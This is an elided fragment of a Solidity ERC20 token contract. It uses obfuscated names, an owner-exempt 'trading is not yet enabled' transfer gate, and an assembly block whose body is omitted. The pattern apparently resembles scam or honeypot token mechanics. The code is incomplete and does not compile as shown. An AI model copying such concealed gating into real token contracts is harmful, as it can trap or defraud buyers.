...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        breezeEmbark.push(_router); breezeEmbark.push(msgSender_); breezeEmbark.push(pair);
        for (uint256 q=0; q < 3;) {frontFold[breezeEmbark[q]] = true; unchecked{q++;} }
    ...
    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((theTrading || (sender == breezeEmbark[1])), "ERC20: trading is not yet enabled.");
        assembly { 
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployDinoC(creator, initialSupply);
    }
}
